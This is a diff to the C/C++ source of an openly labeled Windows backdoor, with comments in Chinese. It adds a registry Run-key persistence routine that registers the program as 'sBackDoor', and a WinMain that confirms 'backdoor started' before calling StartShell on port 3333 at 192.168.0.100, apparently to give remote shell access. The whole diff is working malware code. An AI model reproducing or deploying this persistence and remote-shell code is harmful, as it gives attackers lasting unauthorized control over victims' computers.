@@ -307,11 +307,41 @@ __Error_End:
 	return bRet;
 }
 
+//使用从注册表自动启动的方式启动该后门程序
+BOOL AutoRunWithReg(){
+	BOOL bRet = TRUE;
+	HKEY hKey = NULL;
+	TCHAR szPath[MAX_PATH] = { 0 };
+	TCHAR szSubKey[] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+	GetModuleFileName(NULL, szPath, MAX_PATH);
+
+	LONG lRet = RegOpenKeyEx(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);//打开注册表指定键
+	if (lRet != ERROR_SUCCESS) {
+		bRet = FALSE;
+		goto __Error_End;
+	}
+	lRet = RegSetValueEx(hKey, _T("sBackDoor"), 0, REG_SZ, (BYTE *)szPath, sizeof(szPath));
+	if (lRet != ERROR_SUCCESS) {
+		bRet = FALSE;
+	}
+
+__Error_End:
+	if (hKey) {
+		RegCloseKey(hKey);
+	}
+	return bRet;
+}
+
 ///////////////////////////////////////////////////////////////////
 int APIENTRY _tWinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
 	LPTSTR    lpCmdLine,
 	int       nCmdShow){
+
+	if (AutoRunWithReg()){
+		MessageBox(NULL, _T("后门启动成功！"), _T("提示"), MB_OK);
+	}
+
 	StartShell(3333, _T("192.168.0.100"));
 
 	return 0;
